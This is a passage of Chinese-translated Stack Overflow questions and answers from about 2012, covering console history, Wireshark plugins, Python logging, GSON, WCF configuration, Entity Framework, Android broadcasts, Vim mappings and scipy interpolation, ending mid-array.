[msdn](http://msdn.microsoft.com/en-us/library/ms682077%28v=VS.85%29.aspx "微软")中用于非托管代码的方法对我没有帮助，好的答案可以告诉我如何在 c# 中使用它们来获得我需要的东西。

我的想法是用`ReadKey`only 覆盖向上箭头并以“硬”的方式进行操作，但如果有更简单的方法，我会很高兴。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:05:54.533

我只需将命令保存为 XML 或关系数据库，当需要时，我会将 XML 反序列化为存储为列表或可能是数组的适当对象（如果您有定义数量的命令，例如最后 10 个）。然后覆盖您提到的适当事件，并通过保留您在列表中的位置的计数器来迭代命令对象列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-03-15T16:14:20.697

我知道这是一个老问题，但我也在寻找答案。虽然找不到，所以我构建了 InteractivePrompt。它以[NuGet 包](https://www.nuget.org/packages/InteractivePrompt/)的形式提供，您可以轻松扩展[GitHub 上](https://github.com/sorrell/InteractivePrompt)的代码。它具有当前会话的历史记录，但我计划实现在会话之间保存命令的功能。

这是一个非常有用的包装 DLL 的包，例如 SQLite。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-03-14T21:41:05.003

如果有人寻找类似的东西，我最终使用了 powershell 和一组脚本，但我设法设置了 powershell 历史记录：

[https://software.intel.com/en-us/blogs/2014/06/17/giving-powershell-a-persistent-history-of-commands](https://software.intel.com/en-us/blogs/2014/06/17/giving-powershell-a-persistent-history-of-commands)

```
$HistoryFilePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) .ps_history
Register-EngineEvent PowerShell.Exiting -Action { Get-History | Export-Clixml $HistoryFilePath } | out-null
if (Test-path $HistoryFilePath) { Import-Clixml $HistoryFilePath | Add-History }
# if you don't already have this configured...
Set-PSReadlineKeyHandler -Key UpArrow -Function HistorySearchBackward
Set-PSReadlineKeyHandler -Key DownArrow -Function HistorySearchForward 
```

将该代码保存到文件：C:\Users\\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

# deployment - 如何在其他机器上部署wireshark插件？

> ID：13490498
> 
> 赞同：1
> 
> 时间：2012-11-21T09:51:49.097
> 
> 标签：deployment

我在ubuntu上为wireshark开发了amf插件。我想将它部署在其他机器上。在 1 Linux 2 Windows 上部署它的步骤是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T13:12:11.550

如果您成功地在 Ubuntu 中构建了插件，您将在“wireshark/plugins//.libs”目录中找到 .so 二进制文件。从命令行安装 Wireshark 并将二进制文件粘贴到“/usr/lib/wireshark/libwireshark1/plugins”中。您还可以在该位置找到其他 .so 二进制文件。如果您的插件与安装的 Wireshark 版本兼容，那么它应该可以工作。但是，我不确定它是否会在所有 Linux 平台上兼容。另外，我使用的是 Ubuntu 12.04，旧版本的说明很可能有所不同。

对于 Windows，您必须在 Windows 机器上单独编译它。之后，您将在“wireshark/plugins/”中找到 .dll 文件。只需将其复制并粘贴到“Wireshark\plugins\\”文件夹中，该文件夹可以在您安装 Wireshark 的任何位置找到。

注意：您的插件应该使用与用于构建 Wireshark的编译器**相同的编译器进行编译。**您可以通过单击“帮助->关于 Wireshark”在 Wireshark 中查看此信息。

# javascript - 需要帮助使用 jQuery（或插件）来创建不断移动的图片（在一个重复的方向上）

> ID：13490499
> 
> 赞同：3
> 
> 时间：2012-11-21T09:51:50.097
> 
> 标签：javascript, jquery, html, jquery-ui, jquery-plugins

我有一个很长的图像。我想将图像分成大约 10 个（这样每个部分都是一个单独的链接），但是让整个东西平滑地向一个方向滑动（并重复）。我还希望能够从图像中的任何点随机开始。我似乎找不到一个好的 jQuery 插件来开始这个。你有什么想法？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:55:16.050

您可以使用带有 setInterval 函数的 JavaScript 动态更改 div 背景图像的位置

# python - python logging 检索特定处理程序

> ID：13490506
> 
> 赞同：3
> 
> 时间：2012-11-21T09:52:07.570
> 
> 标签：python, logging

我们在一个 python 程序/库上工作，我们想为其设置一个日志系统。基本上，我们想在终端上或文件上登录。为此，我们将使用标准发行版中嵌入的优秀日志记录包。

日志级别应该由用户通过其首选项进行自定义。我的问题是如何检索连接到记录器的处理程序之一？我在想有点像这样的事情：

```
import logging

class NullHandler(logging.Handler):
    def emit(self,record):
        pass

HANDLERS = {}
HANDLERS['console'] = logging.StreamHandler()
HANDLERS['logfile'] = logging.FileHandler('test.log','w')

logging.getLogger().addHandler(NullHandler())
logging.getLogger('console').addHandler(HANDLERS['console'])
logging.getLogger('logfile').addHandler(HANDLERS['logfile'])

def set_log_level(handler, level):
    if hanlder not in HANDLERS:
        return

    HANDLERS[handler].setLevel(level)

def log(message, level, logger=None):

    if logger is None:
        logger= HANDLERS.keys()

    for l in logger:
        logging.getLogger(l).log(level, message) 
```

如您所见，我的实现意味着使用 HANDLERS 全局字典来存储我创建的处理程序的实例。我找不到更好的方法来做到这一点。在那个设计中，可以说因为我只是为每个记录器插入一个处理程序，我的记录器对象的处理程序属性应该没问题，但我正在寻找更通用的东西（即如果有一天一个多个处理程序被插入怎么办到我的一个记录器？）

你怎么看待这件事 ？

非常感谢您

埃里克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:09:34.353

您不仅可以设置处理程序的级别，还可以设置记录器的级别：

```
import logging
class NullHandler(logging.Handler):
    def emit(self,record):
        pass

logging.getLogger().addHandler(NullHandler())
logging.getLogger('console').addHandler(logging.StreamHandler())

logging.getLogger('console').info("foo")
logging.getLogger('console').setLevel(1000)
logging.getLogger('console').info("foo")
logging.getLogger('console').setLevel(1)
logging.getLogger('console').info("foo") 
```

请注意，处理程序的日志级别与此级别无关，并且仅在达到两个级别时才记录处理程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-28T14:19:31.700

有点晚了，但这是一种方法：

创建处理程序时，您可以设置名称，如下所示：

```
import logging

stream_handler = logging.StreamHandler()
# Set name for handler
stream_handler.name = "stream_handler"

logging.getLogger().addHandler(stream_handler)

# Use name to find specific handler from list of all handlers for the logger
for handler in logging.getLogger().handlers:
    if handler.name == "stream_handler":
        print(f"Found stream_handler={stream_handler}") 
```

# java - 使用接口的构造函数中的错误设置值

> ID：13490507
> 
> 赞同：1
> 
> 时间：2012-11-21T09:52:08.337
> 
> 标签：java, oop, interface, parent-child

我得到了需要用 GSON 解析为对象的 json：

```
"product":{
"product_type":"assignment",
"id":717,
    "product_profile":{
    "title":"new Order from java",
    "info":"Some special info",
    "dtl_expl":true,
    "special_info":""
    }
} 
```

“product_profile”将是不同的对象，具体取决于我在“product_type”中得到的内容。我为每个对象创建了类——作业和写作。它们是 ProductType 类的子级。我在 Product 类中实现接口，该接口应该返回正确的对象 - 赋值或写入取决于“product_type”中的值。我的产品类别

```
public class Product implements IProductType{
    ProductAssignment prodAss;
    ProductWriting prodWr;
    ProductType returnState;

    @SerializedName("id")
    int id;
    @SerializedName("product_type")
    String product_type;
    @SerializedName("product_profile")
    ProductType product_profile;
    public Product()
    {

    }
    public Product(int id, String product_type, ProductType product_profile)
    {
        this.id = id;
        this.product_type = product_type;
        this.product_profile = product_profile;
    }
    public int getProductId() 
    {
         return this.id;
    }
    public String getProductType() 
    {
         return this.product_type;
    }
    public ProductType getProduct() 
    {
         return this.returnObject(product_type);
    }
    public void setProductId(int id) 
    {
        this.id = id;
    }
    public void setProductTitle(String product_type) 
    {
        this.product_type = product_type;
    }
    public void setProduct(ProductType product_profile) 
    {
        this.product_profile =  this.returnObject(product_type);
    }
    @Override
    public String toString() {
        return "id=" + id + " " + "title=" + product_type
                + " " + "profile=" + product_profile  +  "}";
    }
    @Override
    public ProductType returnObject(String res) 
    {

        System.out.println("Product");
        System.out.println(product_profile);
        if (res.equals("assignment"))
        {
            this.product_profile = new ProductAssignment();
            System.out.println("I'm going to parse Assignment");
        }
        else if  (res.equals("writing"))
            this.product_profile =  new ProductWriting();

        return product_profile;

    }

} 
```

但是当我尝试将 json 解析为这样的对象时：

```
 Gson gson = new Gson();
  Product product = gson.fromJson(res,Product.class); 
```

我得到这样一个产品对象：

```
id=447 title=assignment profile=ProductType@e49f9fa 
```

所以“id”和“product_type”解析正确，但它不是ProdutType中的Assignment对象。

我的 ProductType 类：

```
 public class ProductType implements IProductType{
    String product;

    static ProductType productType;
    static ProductAssignment productAssignment;
    static ProductWriting productWriting;
    IProductType component;

    ProductType returnState;
    ProductAssignment prodAss;
    ProductWriting prodWr;
    public ProductType()
    {       
    }
    public ProductType(IProductType c)
    {
         component = c;
    }
    public ProductType getProductType()
    {
        return this.returnState;
    }
    public void setProductType(ProductType returnState)
    {
        this.returnState = returnState;
    }
    @Override
    public ProductType returnObject(String product_type) 
    {
        if (product_type.equals("assignment"))
        {
            this.returnState = new ProductAssignment();
            System.out.println("I'm going to parse Assignment");
        }
        else if  (product_type.equals("writing"))
            this.returnState =  new ProductWriting();

        return returnState;
    }
    @Override
    public String toString()
    {
        return returnState.getClass().getName();
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:57:11.653

看起来不错。要获得*正确*的输出，您需要`toString()`在`ProductType`类中覆盖。

# content-management-system - 什么基于 java 的 CMS 可以管理现有页面的内容？

> ID：13490509
> 
> 赞同：3
> 
> 时间：2012-11-21T09:52:16.807
> 
> 标签：content-management-system, opencms

我们有一个现有的并正在运行的 java web 应用程序，目前页面的内容是静态的，但页面仍然是 jsp 文件，它们具有专门设计的外观和感觉。我的客户现在想使用 CMS 来管理新闻、事件等内容的更新，只需对 jsp 代码进行最小的更改，我尝试了 opencms，但还没有发现它可以做到这一点。据我所知，需要在 opencms 世界中通过 opencms ade 创建页面。布局、外观和感觉必须遵循 opencms 的模式，也就是说页面上有很多块内容。有没有一种 CMS 可以满足我的要求？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T03:33:17.390

[OpenCms](http://www.opencms.org)和[Magnolia](http://www.magnolia-cms.com)是领先的基于 Java 的开源 CMS。他们可以做到，但当然要付出一些努力，这取决于您当前网站的架构。

如果您只是并且真的只是在当前网站中使用 JSP，那么您可以将 JSP 转储到 OpenCms 中，仅此而已。然后您在 OpenCms 中拥有网站，当然还不能编辑，然后使用结构化内容元素 (XSD) 逐步集成可编辑元素。该过程无法在此处的答案中简要描述，因为它非常复杂，肯定需要一些 OpenCms 经验才能做到，因为它比从头开始构建基于 OpenCms 的网站更难。

如果您当前的应用程序使用像 Spring 这样的框架，那么还有其他步骤。我们之前已经将 Spring 与 OpenCms 集成，并且可以正常工作。

我认为大多数 java CMS 都可以满足您的需要，但所有这些都需要一些努力。此外，如果您在当前应用程序中使用 jars，则需要检查这些 jars 与您正在使用的 OpenCms 版本之间是否没有冲突。

或者，如果您的 CMS 要求非常基本，您可以通过实现 FCKEditor / [CKEditor](http://ckeditor.com)创建自己的小型 CMS 功能。

请提供有关您当前的技术堆栈/框架等的更多详细信息。然后更详细地回答会更容易。

**更新（2015 年）：**

截至 2015 年，我同时从 OpenCms 转移到 Magnolia，并且非常推荐。文档很棒，他们明确地有一个名为 Blossom 的 Spring 集成模块。[https://documentation.magnolia-cms.com/display/DOCS/Blossom+module](https://documentation.magnolia-cms.com/display/DOCS/Blossom+module)。

# java - Java 可复制对象，类似于此 Python 示例

> ID：13490513
> 
> 赞同：0
> 
> 时间：2012-11-21T09:52:34.927
> 
> 标签：java, python, copy, cloning

所以，这就是我可以在 Python 中做的事情：

```
class Copiable(object):

    def copy_from(self, other):
        """ This method must be implemented by subclasses to define their
            own copy-behaviour. Never forget to call the super-method. """

        pass

    def copy(self):
        """ Creates a new copy of the object the method is called with. """

        instance = self.__new__(self.__class__)
        instance.copy_from(self)
        return instance

class Rectangle(Copiable):

    def __init__(self, x, y, w, h):
        super(Rectangle, self).__init__()
        self.x = x
        self.y = y
        self.w = w
        self.h = h

  # Copiable

    def copy_from(self, other):
        self.x = other.x
        self.y = other.y
        self.w = other.w
        self.h = other.h
        super(Rectangle, self).copy_from(self) 
```

我在它的 Java 版本中面临两个问题：

*   我不知道如何创建类似于 Python`__new__`方法的类的实例。
*   我想`Copiable`成为一个接口，但是，我无法实现该`clone()`方法。

你能想出解决办法吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:01:17.177

Java 使用`new`关键字来构造对象。创建`Copiable`接口不应干扰`clone()`方法。

```
public interface Copiable<T> {
    public T copy();
    public T copyFrom(T other);
}

public class Rectangle implements Copiable<Rectangle> {

    private int x, y, w, h;

    @Override
    public Rectangle copy() {
        return new Rectangle();
    }

    @Override
    public Rectangle copyFrom(Rectangle other) {
        return new Rectangle(other);
    }

    public int getX() {
        return x;
    }

    public int getY() {
        return y;
    }

    public int getW() {
        return w;
    }

    public int getH() {
        return h;
    }

    public Rectangle() {}
    public Rectangle(Rectangle other) {
        this.x = other.getX();
        this.y = other.getY();
        this.w = other.getW();
        this.h = other.getH();
    }
} 
```

# c# - (400) 错误请求和更新条目时发生错误

> ID：13490518
> 
> 赞同：2
> 
> 时间：2012-11-21T09:52:57.367
> 
> 标签：c#, .net, wcf, entity-framework

当对象很小时，我有这个例外

> 更新条目时出错。有关详细信息，请参阅内部异常

当对象很大时，我有这个例外

> 远程服务器返回意外响应：(400) Bad Request

客户端：app.config

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <system.serviceModel>
        <bindings>
            <basicHttpBinding>
                <binding name="BasicHttpBinding_IService11" closeTimeout="00:01:00"
                    openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00"
                    allowCookies="false" bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
                    maxBufferSize="2147483647" maxBufferPoolSize="2147483647"
                    maxReceivedMessageSize="2147483647" messageEncoding="Text"
                    textEncoding="utf-8" transferMode="Buffered" useDefaultWebProxy="true">
                    <readerQuotas maxDepth="2147483647" maxStringContentLength="2147483647"
                        maxArrayLength="2147483647" maxBytesPerRead="2147483647" maxNameTableCharCount="2147483647" />
                    <security mode="None">
                        <transport clientCredentialType="None" proxyCredentialType="None"
                            realm="" />
                        <message clientCredentialType="UserName" algorithmSuite="Default" />
                    </security>
                </binding>
            </basicHttpBinding>
        </bindings>
        <client>
            <endpoint address="http://localhost:10965/Service1.svc" binding="basicHttpBinding"
                bindingConfiguration="BasicHttpBinding_IService11" contract="ServiceReference2.IService1"
                name="BasicHttpBinding_IService11" />
        </client>
    </system.serviceModel>
</configuration> 
```

WCF：web.config

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.web>
      <httpRuntime maxRequestLength="2147483647" />
    <compilation debug="true" targetFramework="4.0">
      <assemblies>
        <add assembly="System.Data.Entity, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
      </assemblies>
    </compilation>
  </system.web>

  <system.serviceModel>
      <bindings>
          <basicHttpBinding>
              <binding name="customBinding" hostNameComparisonMode="StrongWildcard" receiveTimeout="00:10:00" sendTimeout="00:10:00" openTimeout="00:10:00" closeTimeout="00:10:00"
                     maxReceivedMessageSize="2147483647" maxBufferSize="2147483647" maxBufferPoolSize="2147483647" transferMode="Buffered"
                     messageEncoding="Text" textEncoding="utf-8" bypassProxyOnLocal="true" useDefaultWebProxy="true" >
                  <readerQuotas maxArrayLength="2147483647" maxBytesPerRead="2147483647" maxDepth="2147483647" maxStringContentLength="2147483647" maxNameTableCharCount="2147483647"/>
              </binding>
          </basicHttpBinding>
      </bindings>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <!-- To avoid disclosing metadata information, set the value below to false and remove the metadata endpoint above before deployment -->
          <serviceMetadata httpGetEnabled="true" />
          <!-- To receive exception details in faults for debugging purposes, set the value below to true.  Set to false before deployment to avoid disclosing exception information -->
          <serviceDebug includeExceptionDetailInFaults="true" />

        </behavior>
      </serviceBehaviors>
    </behaviors>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
  </system.serviceModel>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true" />
  </system.webServer>
  <connectionStrings><add name="SASPEEntities" connectionString="metadata=res://*/Model1.csdl|res://*/Model1.ssdl|res://*/Model1.msl;provider=System.Data.SqlClient;provider connection string=&quot;Data Source=.;Initial Catalog=SASPE;Integrated Security=True;Pooling=False;MultipleActiveResultSets=True&quot;" providerName="System.Data.EntityClient" /><add name="SASPEEntities1" connectionString="metadata=res://*/Model1.csdl|res://*/Model1.ssdl|res://*/Model1.msl;provider=System.Data.SqlClient;provider connection string=&quot;Data Source=.;Initial Catalog=SASPE;Integrated Security=True;Pooling=False;MultipleActiveResultSets=True&quot;" providerName="System.Data.EntityClient" /><add name="SASPEEntities2" connectionString="metadata=res://*/Model1.csdl|res://*/Model1.ssdl|res://*/Model1.msl;provider=System.Data.SqlClient;provider connection string=&quot;data source=.;initial catalog=SASPE;integrated security=True;pooling=False;multipleactiveresultsets=True;App=EntityFramework&quot;" providerName="System.Data.EntityClient" /></connectionStrings>

</configuration> 
```

和 wcf：web.debug.config

```
<?xml version="1.0"?>

<!-- For more information on using web.config transformation visit http://go.microsoft.com/fwlink/?LinkId=125889 -->

<configuration xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform">

    <system.serviceModel>
        <services>
            <service name="WcfService1.Service1">
                <endpoint address="http://localhost:10965/Service1.svc?wsdl"
                    binding="basicHttpBinding"  bindingConfiguration="customBinding" contract="WcfService1.IService1"  />
            </service>
        </services>
    </system.serviceModel>
</configuration> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:50:40.457

错误“更新条目时发生错误。有关详细信息，请参阅内部异常”当我遇到实体框架与我的数据库通信的问题（列不匹配或溢出等）时，我经常看到如果您执行以下代码您的 WCF 公开类正在通过 WCF 调用，您应该能够查看内部异常并找出 EF 不喜欢您的数据库的哪些方面。

传递大数据时的 400 错误请求看起来很像这里描述的问题-Large

[WCF web service request failed with (400) HTTP Bad Request](https://stackoverflow.com/questions/784606/large-wcf-web-service-request-failing-with-400-http-bad-request?rq=1)

# c# - 如何在 EF 上下文中保存对象并检查它是否存在，而不将其保存到数据库中？

> ID：13490519
> 
> 赞同：1
> 
> 时间：2012-11-21T09:53:03.513
> 
> 标签：c#, entity-framework

我正在尝试填充我的数据库上下文，然后在循环结束时保存所有更改：

```
 foreach (var kommune in valgkreds.Value.SubAreas)
                    {

                        var komExist = dbConnection.Omraade.FirstOrDefault(x => x.Id == kommune.Value.Id);

                        if (komExist == null)
                        {
                            Omraade k = new Omraade();
                            k.Id = kommune.Value.Id;
                            k.titel = kommune.Value.Name;
                            k.type_id = 3;
                            dbConnection.Omraade.Add(k);

                            Krydstabel_Omraade ko_kommune = new Krydstabel_Omraade();
                            ko_kommune.parent = valgkreds.Value.Id;
                            ko_kommune.child = kommune.Value.Id;

                            dbConnection.Krydstabel_Omraade.Add(ko_kommune);

                            Console.WriteLine(k.Id);
                            //Console.WriteLine(++i);
                        }
} 
```

我正在检查我是否已经使用以下行将对象添加到上下文中：

```
var komExist = dbConnection.Omraade.FirstOrDefault(x => x.Id == kommune.Value.Id); 
```

`null`即使已添加对象，它也始终返回。我猜这是因为它还没有保存到数据库中。在执行该方法之前，如何检查它是否在上下文中`SaveChanges()`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:17:06.023

如果您使用的是 EF 4.1+，它们包含一个“查找”方法，允许您在上下文中追踪尚未持久化到数据库的对象-

[http://msdn.microsoft.com/en-US/data/jj573936](http://msdn.microsoft.com/en-US/data/jj573936)

尽管看起来这仅在您使用主键进行搜索时才有效。

# android - 为什么 BroadcastReceiver 收到两个相同的广播

> ID：13490521
> 
> 赞同：2
> 
> 时间：2012-11-21T09:53:14.533
> 
> 标签：android, broadcastreceiver

我正在尝试使用 BroadcastReceiver 从服务接收新消息。但 BroadcastReceiver 总是收到广播两次...接收器代码：

```
private class RecentBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        Bundle messageBundle = intent.getExtras();
        IChatCSMessage message = (IChatCSMessage) messageBundle.get("message");
        String sender = message.getSender().getUserId();
        addRecentBuddy(sender.trim());
        recentBuddyAdapter.notifyDataSetChanged();
        allMessages.get(sender).add(message);
        Log.i("RECENT_RECEIVER", "RECEIVING MESSAGE:" + message.getMessage());
    }
}
public void initReceiver() {
    IntentFilter myIntentFilter = new IntentFilter();
    myIntentFilter.addAction("com.ichat.message");
    recentBroadcastReceiver = new RecentBroadcastReceiver();
    registerReceiver(recentBroadcastReceiver, myIntentFilter);
} 
```

广播是：

```
Intent intent = new Intent("com.ichat.message");
intent.putExtra("message", message);
IChatClientService.this.sendBroadcast(intent); 
```

谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-09T16:18:18.843

这是一个常见的错误，您可能将广播接收器放在 manifest.xml 中，其意图定义如下：

```
 <receiver android:name="RecentBroadcastReceiver">
        <intent-filter> 
            <action android:name="com.ichat.message" /> 
        </intent-filter> 
    </receiver> 
```

并且还在您的代码中创建了一个，就像在您的示例中一样。这实际上是创建两个意图过滤器，因此您可以删除 xml 中的意图过滤器，您应该只会看到一个广播。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T23:10:15.413

您确实没有提供任何证据证明在这两种情况下 Intent 都包含相同的扩展数据。我这样说是因为 a) 您从不记录传入的操作，b) 您没有通过调用 getStringExtra() 获取带有键“消息”的扩展数据（如果该扩展数据的内容确实是一个字符串），并且 c ) 您没有向我们提供 logCat 列表。

我建议使用以下步骤进行调试：

1.  为传入的 Intent 操作调用 Log.i
2.  为“消息”键的传入 Intent 值调用 Log.i。
3.  发布结果。
4.  发布在您*发送*广播 Intent时准确显示“消息”的类型和值的代码

简而言之，您的 BroadcastReceiver 正在接收两个 Intent，大概都带有“com.ichat.message”操作。如果广播仅在您的应用程序中的一个位置，则该位置被到达两次。

# vim - vim，在特定行插入行号

> ID：13490525
> 
> 赞同：2
> 
> 时间：2012-11-21T09:53:31.883
> 
> 标签：vim

我通过在各个地方包含打印语句来测试一些 fortran 代码。我还想在打印语句中包含一个行号，例如：

```
...
write(*,*)'[current line #] I am here'
.....
.....
write(*,*)'[current line #] I am here too' 
```

目前，我正在通过查看状态栏手动插入行号。有没有相同的宏？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T10:04:08.467

一个简单的表达式映射就可以了：

```
:inoremap <expr> <F11> line('.') 
```

或者，如果您更喜欢完整的缩写（输入`debug`+`Space`来触发它）：

```
:inoreabbrev <expr> debug "write(*,*)'" . line('.') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:07:09.770

在*插入*模式下，您可以执行以下操作：

```
<C-r>=line('.')<CR> 
```

在*普通*模式下，您可以创建一个简单的映射：

```
nnoremap <F9> :execute ":normal 0iline number: " . line('.') . " hello world"<CR> 
```

在第 39 行执行时输出：

```
line number: 39 hello world 
```

参见`:help line()`，更一般地说，`:help functions`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T12:34:22.630

请查看链接[http://crueltown.com/wordpress/?p=40](http://crueltown.com/wordpress/?p=40) 我需要这个。谢谢大家的回答。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:01:51.173

您可以`line('.')`在宏中包含返回光标行号的宏。

# python - 谷歌应用引擎数据存储更新错误django python

> ID：13490526
> 
> 赞同：0
> 
> 时间：2012-11-21T09:53:36.257
> 
> 标签：python, django, google-app-engine

我想更新谷歌应用引擎数据存储中的现有实体。我知道 put() 要么创建/更新条目。但就我而言，它总是会创建一个新条目，为什么？...

## 我在views.py中的编辑功能

```
def edit(request,mykey):
   employee=Employeeprofile.get(mykey)
   data={
     'employee_name':employee.employee_name, 
     'employee_number': employee.employee_number,
     'employee_email': employee.employee_email,
     'employee_mobilenumber':employee.employee_mobilenumber,
     'employee_address': employee.employee_address
   }

   form= Employeeprofileform(data)
   import pdb;pdb.set_trace()
   if request.POST:
       form= Employeeprofileform(request.POST)
           if form.is_valid():          
               employee.employee_name =form.cleaned_data['employee_name']
               employee.employee_number=form.cleaned_data['employee_number']
               employee.employee_email = form.cleaned_data['employee_email']
               employee.employee_mobilenumber= form.cleaned_data['employee_mobilenumber']
               employee.employee_address = form.cleaned_data['employee_address']
               employee.put(mykey)
               return HttpResponseRedirect("/listallemployees/")
            else:
               return render_to_response('main/edit.html', {'form': form,'mykey':mykey})

      else:
    return render_to_response('main/edit.html', {'form': form,'mykey':mykey}) 
```

为什么？...

我需要用相同的密钥更新数据。我正在使用 django1.2

# python - 用“定点”在 Python 中插值数据

> ID：13490533
> 
> 赞同：1
> 
> 时间：2012-11-21T09:53:50.703
> 
> 标签：python, scipy, time-series, spline, interpolation

我有本质上是周期性（而且相当正弦）的时间序列数据。我根据周期重新调整数据相位，使所有点都位于 0 和 1 之间。您可以认为这与从 0 到其周期 2pi 的正弦波采样点相同。这是一个典型的案例：

![阶段性周期时间序列数据](../Images/8a75da8f5925d812a02c4109da928689.png)

我尝试使用各种`scipy.interpolate`函数插入这些数据，例如：

```
>>> scipy.interpolate.UnivariateSpline(x,y)(numpy.linspace(0, 0.99, 100))
array([ 15.13403109,  15.10173144,  15.07070986,  15.04094629,
        15.01242068,  14.98511296,  14.95900308,  14.93407098,
        14.91029659,  14.88765987,  14.86614074,  14.84571915,
        14.82637504,  14.80808836,  14.79083904,  14.77460702,
        14.75937224,  14.74511465,  14.73181418,  14.71945078,
        14.70800439,  14.69745494,  14.68778239,  14.67896666,
        14.6709877 ,  14.66382545,  14.65745985,  14.65187085,
        14.64703838,  14.64294238,  14.6395628 ,  14.63687957,
        14.63487264,  14.63352194,  14.63280742,  14.63270902,
        14.63320668,  14.63428034,  14.63590994,  14.63807542,
        14.64075672,  14.64393378,  14.64758655,  14.65169496,
        14.65623896,  14.66119848,  14.66655347,  14.67228387,
        14.67836961,  14.68479064,  14.69152691,  14.69855834,
        14.70586488,  14.71342648,  14.72122306,  14.72923458,
        14.73744098,  14.74582219,  14.75435815,  14.76302882,
        14.77181411,  14.78069399,  14.78964838,  14.79865724,
        14.80770049,  14.81675809,  14.82580996,  14.83483606,
        14.84381632,  14.85273069,  14.8615591 ,  14.87028149,
        14.87887781,  14.887328  ,  14.895612  ,  14.90370974,
        14.91160117,  14.91926624,  14.92668487,  14.93383702,
        14.94070261,  14.9472616 ,  14.95349392,  14.95937952,
        14.96489834,  14.9700303 ,  14.97475537,  14.97905347,
        14.98290455,  14.98628855,  14.98918541,  14.99157507,
        14.99343747,  14.99475255,  14.99550026,  14.99566053,
        14.9952133 ,  14.99413852,  14.99241612,  14.99002605]) 
```

以 x 为例（请注意，某些值重复）：

```
>>> x
array([ 0\.   ,  0.01 ,  0.016,  0.018,  0.024,  0.029,  0.034,  0.036,
        0.042,  0.046,  0.048,  0.053,  0.058,  0.062,  0.069,  0.071,
        0.072,  0.079,  0.083,  0.091,  0.096,  0.102,  0.102,  0.106,
        0.108,  0.111,  0.112,  0.112,  0.122,  0.131,  0.135,  0.136,
        0.137,  0.145,  0.164,  0.168,  0.172,  0.174,  0.177,  0.178,
        0.179,  0.197,  0.202,  0.205,  0.206,  0.213,  0.215,  0.222,
        0.229,  0.233,  0.235,  0.239,  0.239,  0.241,  0.248,  0.255,
        0.258,  0.259,  0.262,  0.264,  0.266,  0.267,  0.276,  0.28 ,
        0.281,  0.281,  0.285,  0.289,  0.292,  0.292,  0.294,  0.295,
        0.299,  0.304,  0.306,  0.309,  0.313,  0.317,  0.32 ,  0.32 ,
        0.335,  0.34 ,  0.341,  0.353,  0.357,  0.359,  0.364,  0.368,
        0.369,  0.369,  0.388,  0.39 ,  0.394,  0.396,  0.399,  0.401,
        0.404,  0.406,  0.407,  0.413,  0.415,  0.418,  0.423,  0.43 ,
        0.438,  0.439,  0.443,  0.445,  0.454,  0.455,  0.475,  0.478,
        0.478,  0.48 ,  0.48 ,  0.482,  0.485,  0.486,  0.488,  0.488,
        0.498,  0.498,  0.499,  0.508,  0.514,  0.525,  0.527,  0.531,
        0.535,  0.536,  0.546,  0.547,  0.551,  0.553,  0.556,  0.563,
        0.57 ,  0.579,  0.584,  0.59 ,  0.594,  0.595,  0.596,  0.606,
        0.606,  0.619,  0.628,  0.631,  0.632,  0.633,  0.638,  0.64 ,
        0.649,  0.652,  0.654,  0.655,  0.669,  0.674,  0.684,  0.688,
        0.689,  0.692,  0.697,  0.697,  0.703,  0.703,  0.703,  0.704,
        0.706,  0.715,  0.715,  0.717,  0.72 ,  0.721,  0.73 ,  0.739,
        0.746,  0.75 ,  0.751,  0.752,  0.757,  0.762,  0.766,  0.766,
        0.783,  0.785,  0.787,  0.79 ,  0.791,  0.791,  0.806,  0.809,
        0.81 ,  0.813,  0.815,  0.816,  0.816,  0.818,  0.82 ,  0.823,
        0.839,  0.849,  0.857,  0.859,  0.862,  0.864,  0.868,  0.869,
        0.875,  0.877,  0.887,  0.888,  0.893,  0.896,  0.905,  0.907,
        0.908,  0.925,  0.926,  0.936,  0.947,  0.949,  0.955,  0.957,
        0.962,  0.97 ,  0.972,  0.976,  0.979,  0.984,  0.985,  0.986,
        0.993,  1\.   ]) 
```

和 y 是，例如：

```
>>> y
array([ 15.048,  15.046,  15.046,  15.037,  15.035,  15.048,  15.034,
        15.041,  15.03 ,  15.034,  15.037,  15.04 ,  15.038,  15.028,
        14.998,  14.976,  15.012,  15.007,  14.996,  14.979,  14.922,
        14.876,  14.881,  14.931,  14.912,  14.904,  14.906,  14.897,
        14.871,  14.786,  14.778,  14.78 ,  14.782,  14.788,  14.729,
        14.735,  14.661,  14.722,  14.668,  14.657,  14.715,  14.647,
        14.607,  14.627,  14.607,  14.625,  14.619,  14.592,  14.583,
        14.596,  14.596,  14.595,  14.584,  14.593,  14.601,  14.597,
